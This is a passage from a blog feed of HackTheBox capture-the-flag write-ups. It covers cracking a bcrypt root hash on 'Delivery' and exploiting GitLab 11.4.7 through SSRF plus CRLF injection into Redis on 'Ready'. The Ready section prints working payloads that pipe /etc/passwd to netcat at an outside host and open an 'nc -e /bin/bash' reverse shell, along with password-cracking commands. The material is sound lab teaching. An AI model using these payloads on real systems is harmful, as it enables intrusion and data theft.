<span style="color:#f92672">|</span> iamf                             <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>ZYEM.GLMnAfq8eM.<span style="color:#ae81ff">2</span>rs8q.e<span style="color:#f92672">/</span>q3bHaOVOCvlu7YGhU0rU0Ug4PME9a <span style="color:#f92672">|</span>
<span style="color:#f92672">+----------------------------------+--------------------------------------------------------------+</span>
<span style="color:#ae81ff">12</span> rows <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">000</span> sec)

MariaDB [mattermost]<span style="color:#f92672">&gt;</span>
</code></pre></div><p>Those are bcrypt hashes, but let’s prioritize the root hash.</p>
<h4 id="cracking-the-hash">Cracking the Hash</h4>
<p>Based on the conversations on Mattermost, there is someone in the system that uses a variant of “PleaseSubscribe!” and they were talking about hashcat rules.</p>
<p>I remember exactly that Ippsec (the box author) has shown several techniques on how to generate a variant of seasonal passwords on <a href="https://www.youtube.com/watch?v=H9FcE_FMZio&amp;t=730s">Forest</a> .</p>
<p>Now the idea is instead of generating seasonal passwords, I can try to generate a few variant of &ldquo;PleaseSubscribe!&rdquo; and use them for cracking.</p>
<p>So, I&rsquo;ll start by calculating the length of “PleaseSubscribe!”.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70»
$ echo -n <span style="color:#e6db74">&#39;PleaseSubsribe!&#39;</span> | wc -c
<span style="color:#ae81ff">15</span>
</code></pre></div><p>It has length of 15. I&rsquo;ll save the &ldquo;PleaseSubscribe!&rdquo; string to a file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70»
$ echo <span style="color:#e6db74">&#39;PleaseSubscribe!&#39;</span> &gt; IppsecSubscriber
</code></pre></div><p>Then I’ll feed that file to <code>hashcat</code> to generate some new variant of it using base64 rule, and I&rsquo;ll take out only the string which has a length greater than 15 and pipe the output to a file called <code>custom_wordlist</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">
→ root@kali «delivery» «10.10.14.70»
$ hashcat IppsecSubscriber -r /usr/share/hashcat/rules/best64.rule --stdout | awk <span style="color:#e6db74">&#39;length($0) &gt; 15&#39;</span> &gt; custom_wordlist
</code></pre></div><p>It produces 46 words.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70»
$ wc -w custom_wordlist
<span style="color:#ae81ff">46</span> custom_wordlist
</code></pre></div><p>With that wordlist the hash gets cracked instantly!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">C:<span style="color:#ae81ff">\t</span>ools<span style="color:#ae81ff">\h</span>ashcat6&gt;hashcat.exe -m <span style="color:#ae81ff">3200</span> <span style="color:#e6db74">&#39;$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO&#39;</span> custom_wordlist --force

....
$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21

Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish <span style="color:#f92672">(</span>Unix<span style="color:#f92672">)</span>
Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjO
Time.Started.....: Mon Mar <span style="color:#ae81ff">15</span> 21:36:35 <span style="color:#ae81ff">2021</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> sec<span style="color:#f92672">)</span>
Time.Estimated...: Mon Mar <span style="color:#ae81ff">15</span> 21:36:36 <span style="color:#ae81ff">2021</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
....
</code></pre></div><p>The recovered password is <code>PleaseSubscribe!21</code>.</p>
<h4 id="su---root">SU - root</h4>
<p>That password works on root user.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">maildeliverer@Delivery:~$ su root
Password: 
root@Delivery:/home/maildeliverer# id
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
</code></pre></div><p>Now I can just grab the root flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@Delivery:/home/maildeliverer# cd ~
root@Delivery:~# ls -l
total 16
-rwxr-x--- 1 root root  103 Dec 26 11:26 mail.sh
-r-------- 1 root root  382 Dec 28 07:02 note.txt
-rw-r----- 1 root root 1499 Dec 26 10:55 py-smtp.py
-r-------- 1 root root   33 May 21 11:21 root.txt
root@Delivery:~# cat *.txt
I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I&#39;ve seen several times.  The inspiration for the box is here: 

- https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c 

Keep on hacking! And please don&#39;t forget to subscribe to all the security streamers out there.

- ippsec
a7d68baadc3b3c072c6...&lt;SNIP&gt;...
</code></pre></div><p>There is also a message from the <a href="https://www.youtube.com/c/ippsec/videos">box’s author</a>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@Delivery:~# cat note.txt
I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I&#39;ve seen several times. The inspiration for the box is here:

- https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c

Keep on hacking! And please don&#39;t forget to subscribe to all the security streamers out there.
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c">https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Ready</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-ready/</link>
      <pubDate>Sat, 15 May 2021 22:00:39 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-ready/</guid>
      <description>Turns SSRF to remote code execution and escape from Docker container</description>
      <content:encoded><![CDATA[<p>Ready is a medium difficulty Linux machine from HackTheBox that features a GitLab instance in a Docker container. By chaining two CVEs, I&rsquo;m able to gain a foothold on the container. Enumerating inside the container discovers a password that can be used on container root account. The container is found to be running in privileged mode, and this can be abused to mount the host file system into the container.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>GitLab 11.4.7 exploitation</li>
<li>Chaining bugs from CVE-2018-19571 and CVE-2018-19585</li>
<li>Docker security</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>BurpSuite - Preinstalled in Kali Linux</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>All ports scan with <code>nmap</code> discovers two open ports: SSH on port 22, and a HTTP web server on port 5080</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «ready» «10.10.14.20» 
$ nmap -p- -sV --reason -oA nmap/10-initial-ready <span style="color:#e6db74">&#39;10.10.10.220&#39;</span>
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-05-14 04:53 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.220
Host is up, received echo-reply ttl <span style="color:#ae81ff">63</span> <span style="color:#f92672">(</span>0.18s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65533</span> closed ports
Reason: <span style="color:#ae81ff">65533</span> resets
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span> OpenSSH 8.2p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
5080/tcp open  http    syn-ack ttl <span style="color:#ae81ff">62</span> nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 503.44 seconds
</code></pre></div><p>After performing a default script scan shows there&rsquo;s a GitLab instance on port 5080.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «ready» «10.10.14.20» 
$ nmap -p22,5080 -sC -sV --reason -oA nmap/10-default-ready 10.10.10.220
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-05-14 05:17 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.220
Host is up, received echo-reply ttl <span style="color:#ae81ff">63</span> <span style="color:#f92672">(</span>0.090s latency<span style="color:#f92672">)</span>.

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span> OpenSSH 8.2p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
5080/tcp open  http    syn-ack ttl <span style="color:#ae81ff">62</span> nginx
| http-robots.txt: <span style="color:#ae81ff">53</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in <span style="color:#ae81ff">\x</span>C2<span style="color:#ae81ff">\x</span>B7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.70 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-5080---gitlab">TCP 5080 - GitLab</h3>
<p>The page displays a self-hosted GitLab Community Edition.</p>
<p><img class="img-container" src="imgs/image-20210514162031899.png" alt="image-20210514162031899"  />
</p>
<p>I can register with any email domain.</p>
<p><img class="img-container" src="imgs/image-20210514162151369.png" alt="image-20210514162151369"  />
</p>
<p>The GitLab version can be seen by visiting<code>/help</code>, and it seems to be an outdated one.</p>
<p><img class="img-container" src="imgs/image-20210514162920343.png" alt="image-20210514162920343"  />
</p>
<p>I&rsquo;ll take a note on the version.</p>
<h4 id="user-enumeration-via-gitlab-api">User Enumeration via GitLab API</h4>
<p>I can enumerate the GitLab users via <code>/api/v4/users</code>, but in the end, this was not used.</p>
<p><img class="img-container" src="imgs/image-20210514162754664.png" alt="image-20210514162754664"  />
</p>
<p>I&rsquo;ll move and search for vulnerabilities.</p>
<h4 id="searchsploit">Searchsploit</h4>
<p>I can feed the GitLab version to <code>searchsploit</code>, and it returns with two exploits that match with the version.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «~» «10.10.14.20» 
$ searchsploit GitLab 11.4.7    
-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
GitLab 11.4.7 - RCE (Authenticated) (2)                                   | ruby/webapps/49334.py
GitLab 11.4.7 - Remote Code Execution (Authenticated) (1)                 | ruby/webapps/49257.py
-------------------------------------------------------------------------- ---------------------------------
</code></pre></div><p>I relaxed the search keyword to find other potential exploits, and I found an arbitrary file read which previously was used to exploit <a href="/writeup/htb-laboratory">Laboratory</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «exploit» «10.10.14.20»
$ searchsploit GitLab
-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
GitLab - &#39;impersonate&#39; Feature Privilege Escalation                       | ruby/webapps/40236.txt
GitLab 11.4.7 - RCE (Authenticated) (2)                                   | ruby/webapps/49334.py
GitLab 11.4.7 - Remote Code Execution (Authenticated) (1)                 | ruby/webapps/49257.py
GitLab 12.9.0 - Arbitrary File Read                                       | ruby/webapps/48431.txt
Gitlab 12.9.0 - Arbitrary File Read (Authenticated)                       | ruby/webapps/49076.py
Gitlab 6.0 - Persistent Cross-Site Scripting                              | php/webapps/30329.sh
Gitlab-shell - Code Execution (Metasploit)                                | linux/remote/34362.rb
Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting         | java/webapps/47927.txt
NPMJS gitlabhook 0.0.17 - &#39;repository&#39; Remote Command Execution           | json/webapps/47420.txt
-------------------------------------------------------------------------- ---------------------------------
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-git">Shell as git</h3>
<h4 id="gitlab-1147-rce-cve-2018-19571--cve-2018-19585---poc">GitLab 11.4.7 RCE (CVE-2018-19571 &amp; CVE-2018-19585) - PoC</h4>
<p>The RCE exploit that was popped on <code>searchsploit</code> above is consist of two vulnerabilities, SSRF (CVE-2018-19571) and CRLF Injection (CVE-2018-19585). The exploit&rsquo;s author uses the <a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/">LifeOverFlow</a>&rsquo;s blog post as reference. So I decided to read that blog and try to reproduce it here.</p>
<p>With SSRF, you can talk with the internal Redis server on port 6379 that used by GitLab as database, cache and message broker. If there is an HTTP request sent to the Redis server using SSRF, the request would read as follows (<code># ==&gt;</code>  is a comment by me)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">GET blablabla HTTP/1.1 # ==&gt; Redis read this as a command 
</span><span style="color:#960050;background-color:#1e0010">Host: [0:0:0:0:0:ffff:127.0.0.1]:6379 
</span><span style="color:#960050;background-color:#1e0010">User-Agent: git/2.18.1  
</span><span style="color:#960050;background-color:#1e0010">Accept: */* 
</span><span style="color:#960050;background-color:#1e0010">Accept-Encoding: deflate, gzip 
</span><span style="color:#960050;background-color:#1e0010">Pragma: no-cache 
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">- Err wrong number of arguments for &#39;get&#39; command 
</span></code></pre></div><p>The idea here is to use the CRLF Injection to insert a payload after the &lsquo;GET&rsquo;  line.</p>
<p>For this, I’ll need Burp Suite turned on.</p>
<p>On GitLab, I’ll import a (non-exist) project and choose the &ldquo;Repo by URL&rdquo; menu.</p>
<p><img class="img-container" src="imgs/image-20210514171125509.png" alt="image-20210514171125509"  />
</p>
<p>I&rsquo;ll be using the same SSRF payload to bypass the GitLab URL filter which is <code>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/</code> and add my (non-exist) <code>.git</code> repository at the end of the URL, so it becomes <code>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/ssrf-test.git</code></p>
<p><img class="img-container" src="imgs/image-20210515000620634.png" alt="image-20210515000620634"  />
</p>
<blockquote>
<p>The repository URL above is a <a href="http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm">special IPv6 address</a> where its last 32 bits is used to embed the IPv4 address. The URL was used to bypass the SSRF protection defined in <code>spec/lib/gitlab/url_blocker_spec.rb</code></p>
</blockquote>
<p>I&rsquo;ll intercept the request after I hit the “Create Project” button, and then on BurpSuite, I’ll modify the import URL to this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"> git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/
 multi

 sadd resque:gitlab:queues system_hook_push

 lpush resque:gitlab:queue:system_hook_push &#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;|cat /etc/passwd | nc 10.10.14.20 9000\&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;

 exec
 exec
/ssrf-test.git
</code></pre></div><p>So the HTTP request now looks like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> /projects <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.10.220:5080</span>
User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://10.10.10.220:5080/projects/new</span>
Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">778</span>
Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">sidebar_collapsed=false; _gitlab_session=4426e39af6c1d3d4a4484a8a53f0bac9; event_filter=all</span>
Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>

utf8=%E2%9C%93&amp;authenticity_token=cbS9UXXZDmvTgBUhOTMxF%2FOSii%2FgetcSbM%2FNTT2dG6NllhoQsV8uvbDU65arU9dEOumftKI48ZaDBi6rnJbjOQ%3D%3D&amp;project%5Bimport_url%5D= git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/
 multi

 sadd resque:gitlab:queues system_hook_push

 lpush resque:gitlab:queue:system_hook_push &#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;|cat /etc/passwd | nc 10.10.14.20 9000\&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;

 exec
 exec
/ssrf-test.git&amp;project%5Bci_cd_only%5D=false&amp;project%5Bname%5D=SSRF+test&amp;project%5Bnamespace_id%5D=5&amp;project%5Bpath%5D=ssrf-test&amp;project%5Bdescription%5D=&amp;project%5Bvisibility_level%5D=0
</code></pre></div><p>After I hit the send button, my <code>nc</code> listener caught the file contents of <code>/etc/passwd</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> root@kali «exploit» «10.10.14.20» 
$ nc -nvlp <span style="color:#ae81ff">9000</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9000</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.20<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.220<span style="color:#f92672">]</span> <span style="color:#ae81ff">36612</span>
...&lt;SNIP&gt;...
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
dude:x:1000:1000::/home/dude:/bin/bash
</code></pre></div><p><img class="img-container" src="imgs/image-20210515002210570.png" alt="image-20210515002210570"  />
</p>
<h4 id="weaponize---reverse-shell">Weaponize - Reverse Shell</h4>
<p>From here, I’ll reproduce the step above, but this time I’ll send myself a shell. The payload as follows.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"> git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/
 multi

 sadd resque:gitlab:queues system_hook_push

 lpush resque:gitlab:queue:system_hook_push &#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;|nc -e /bin/bash 10.10.14.20 9000\&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;

 exec
 exec
/ssrf-to-rce.git
</code></pre></div><p>On my <code>nc</code> listener:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «exploit» «10.10.14.20» 
$ nc -nvlp 9000
listening on [any] 9000 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.10.220] 37306
id
uid=998(git) gid=998(git) groups=998(git)
hostname
gitlab.example.com
pwd   
/var/opt/gitlab/gitlab-rails/working
</code></pre></div><h4 id="shell-upgrade">Shell Upgrade</h4>
<p>I&rsquo;ll do the &lsquo;stty&rsquo; trick to <a href="https://fahmifj.medium.com/get-a-fully-interactive-reverse-shell-b7e8d6f5b1c1">upgrade my shell</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">which python3
/opt/gitlab/embedded/bin/python3
python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
git@gitlab:~/gitlab-rails/working$ ^Z
<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">2354</span> suspended  nc -nvlp <span style="color:#ae81ff">9000</span>
→ root@kali «exploit» «10.10.14.20» 
$ stty raw -echo; fg
<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>  - <span style="color:#ae81ff">2354</span> continued  nc -nvlp <span style="color:#ae81ff">9000</span>

git@gitlab:~/gitlab-rails/working$ 
git@gitlab:~/gitlab-rails/working$ export TERM<span style="color:#f92672">=</span>xterm
</code></pre></div><p>On <code>/home</code>, there is only one user called <code>dude</code>, and I&rsquo;m able to read the user flag there.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@gitlab:/home/dude$ ls -la
total <span style="color:#ae81ff">24</span>
drwxr-xr-x <span style="color:#ae81ff">2</span> dude dude <span style="color:#ae81ff">4096</span> Dec  <span style="color:#ae81ff">7</span> 16:58 .
drwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Dec  <span style="color:#ae81ff">2</span> 10:45 ..
lrwxrwxrwx <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Dec  <span style="color:#ae81ff">7</span> 16:58 .bash_history -&gt; /dev/null
-rw-r--r-- <span style="color:#ae81ff">1</span> dude dude  <span style="color:#ae81ff">220</span> Aug <span style="color:#ae81ff">31</span>  <span style="color:#ae81ff">2015</span> .bash_logout
-rw-r--r-- <span style="color:#ae81ff">1</span> dude dude <span style="color:#ae81ff">3771</span> Aug <span style="color:#ae81ff">31</span>  <span style="color:#ae81ff">2015</span> .bashrc
-rw-r--r-- <span style="color:#ae81ff">1</span> dude dude  <span style="color:#ae81ff">655</span> May <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2017</span> .profile
-r--r----- <span style="color:#ae81ff">1</span> dude git    <span style="color:#ae81ff">33</span> Dec  <span style="color:#ae81ff">2</span> 10:46 user.txt
git@gitlab:/home/dude$ cat user.txt 
e1e30b052b6ec0670698...&lt;SNIP&gt;...
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="container-enumeration">Container enumeration</h4>
<p>I found a <code>.dockerenv</code> on the root directory which indicates that I&rsquo;m inside container, and there is also a file called <code>root_pass</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@gitlab:~$ ls -la /
total <span style="color:#ae81ff">104</span>
drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Dec  <span style="color:#ae81ff">1</span> 12:41 .
drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Dec  <span style="color:#ae81ff">1</span> 12:41 ..
-rwxr-xr-x   <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">0</span> Dec  <span style="color:#ae81ff">1</span> 12:41 .dockerenv
...&lt;SNIP&gt;...
-rw-r--r--   <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">23</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> root_pass
</code></pre></div><p>The content of <code>root_pass</code> is a random string, which I think it is a password. I tried it to the user and root account but it didn&rsquo;t work.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@gitlab:/opt/backup$ cat /root_pass 
YG65407Bjqvv9A0a8Tm_7w
</code></pre></div><p>Exploring on <code>/opt</code>, I found a folder called <code>backup</code>. The folder contains three files: <code>docker-compose.yml</code>, <code>gitlab-secrets.json</code> and <code>gitlab.rb</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@gitlab:/opt/backup$ ls -l
total <span style="color:#ae81ff">100</span>
-rw-r--r-- <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">872</span> Dec  <span style="color:#ae81ff">7</span> 09:25 docker-compose.yml
-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">15092</span> Dec  <span style="color:#ae81ff">1</span> 16:23 gitlab-secrets.json
-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">79639</span> Dec  <span style="color:#ae81ff">1</span> 19:20 gitlab.rb
</code></pre></div><p>Upon performing a recursive grep to search for files containing a &ldquo;pass&rdquo; string inside the folder, I discovered an SMTP password on <code>gitlab.rb</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@gitlab:/opt/backup$ grep -Ri <span style="color:#e6db74">&#34;pass&#34;</span>
...&lt;SNIP&gt;...
gitlab.rb:gitlab_rails<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;smtp_password&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;wW59U!ZKMbG9+*#h&#34;</span>
...&lt;SNIP&gt;...
</code></pre></div><p>Looking into the <code>docker-compose.yml</code>, I see a potential vector for container breakout.</p>
